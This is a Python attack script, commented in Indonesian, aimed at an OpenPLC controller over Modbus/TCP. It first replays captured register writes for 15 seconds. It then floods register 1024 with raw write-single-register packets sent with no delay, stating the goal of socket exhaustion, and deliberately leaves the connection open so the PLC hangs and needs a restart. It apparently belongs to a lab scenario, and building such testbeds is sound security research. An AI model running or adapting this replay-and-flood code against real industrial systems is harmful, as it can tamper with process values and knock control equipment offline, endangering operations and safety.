import time
import socket
from pymodbus.client import ModbusTcpClient

# ==========================================
# KONFIGURASI TARGET
# ==========================================
TARGET_IP = "192.168.100.93"
TARGET_PORT = 502
UNIT_ID = 1

# ==========================================
# FASE 1: REPLAY (ODO=79) — tetap pakai pymodbus
# ==========================================
REPLAY_START_REG = 1024
REPLAY_VALUES = [79, 2250, 14500, 1, 125, 1, 1]
REPLAY_DURATION = 15
REPLAY_INTERVAL = 1

# ==========================================
# FASE 2: EXTREME FLOODING — RAW SOCKET
# ==========================================
FLOOD_REGISTER = 1024
FLOOD_VALUE = 1212

def run_replay():
    print(f"[*] Memulai fase Replay ke {TARGET_IP}:{TARGET_PORT} selama {REPLAY_DURATION} detik...")
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    if client.connect():
        client.unit_id = UNIT_ID
        start_time = time.time()
        while (time.time() - start_time) < REPLAY_DURATION:
            try:
                client.write_registers(REPLAY_START_REG, REPLAY_VALUES)
                print(f"[+] Replay FC16 terkirim: ODO={REPLAY_VALUES[0]}")
            except Exception as e:
                print(f"[-] Error Replay: {e}")
            time.sleep(REPLAY_INTERVAL)
        client.close()
        print("[*] Fase Replay selesai.\n")
    else:
        print("[-] Gagal terhubung ke OpenPLC untuk fase Replay.")

def run_flood():
    print("[*] Memulai fase Flooding agresif (raw socket)... Tekan Ctrl+C untuk menghentikan.")
    print("[*] Skrip ini akan membuat OpenPLC kehabisan resource (socket exhaustion).")
    try:
        # Buat satu koneksi TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        count = 0
        while True:
            # Bangun paket Modbus Write Single Register (FC=6)
            packet = bytes([
                0x00, 0x00,           # Transaction ID
                0x00, 0x00,           # Protocol ID
                0x00, 0x06,           # Length (6 bytes after this)
                UNIT_ID,              # Unit ID
                0x06,                 # Function Code 6
                (FLOOD_REGISTER >> 8) & 0xFF, FLOOD_REGISTER & 0xFF,
                (FLOOD_VALUE >> 8) & 0xFF, FLOOD_VALUE & 0xFF
            ])
            s.send(packet)
            count += 1
            if count % 10000 == 0:
                print(f"[+] {count} paket terkirim", end='\r')
            # Tanpa sleep -> kirim secepat mungkin
    except KeyboardInterrupt:
        print("\n\n[*] Flooding dihentikan secara manual (Ctrl+C).")
        print("[*] Koneksi TCP dibiarkan menggantung (tidak ditutup).")
        print("[*] OpenPLC seharusnya sekarang terputus/hang dan membutuhkan restart service.")
        # Jangan tutup socket, biarkan terbuka agar koneksi tetap menggantung di sisi server
        # Jika ingin benar-benar menutup, tambahkan: s.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    print("=== Skenario 3: REPLAY + FLOOD ===")
    run_replay()
    time.sleep(1)
    run_flood()